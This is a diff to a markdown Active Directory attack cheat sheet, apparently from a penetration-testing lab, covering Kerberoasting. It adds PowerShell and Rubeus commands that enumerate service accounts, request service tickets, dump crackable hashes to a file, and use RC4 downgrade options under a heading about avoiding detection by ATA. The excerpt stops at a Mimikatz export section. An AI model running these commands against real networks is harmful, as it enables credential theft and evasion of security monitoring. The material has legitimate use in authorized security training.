@@ -13,25 +13,42 @@
   * [Trust abuse SQL](#Trust-abuse-SQL) 
 
 ## Kerberoast
+- https://github.com/GhostPack/Rubeus
 #### Find user accounts used as service accounts
 ```
 . ./GetUserSPNs.ps1
 ```
+
 ```
-Get-NetUser -SPN
+Get-DomainUser -SPN
+Get-DomainUser -SPN | select samaccountname,serviceprincipalname
 ```
+
 ```
-Get-NetUser -SPN | select samaccountname,serviceprincipalname
+Rubeus.exe kerberoast /stats
 ```
 
 #### Reguest a TGS
 ```
 Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
 ```
-or
+
 ```
 Request-SPNTicket "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+```
+
+```
+Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple
+Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
+```
+
+#### Request TGS Avoid detection
+- Based on encryption downgrade for Kerberos Etype (used by likes ATA - 0x17 stands for rc4-hmac).
+- Look for kerberoastable accounts that only supports RC4_HMAC
+```
+Rubeus.exe kerberoast /stats /rc4opsec
+Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /rc4opsec
 ```
 
 #### Export ticket using Mimikatz
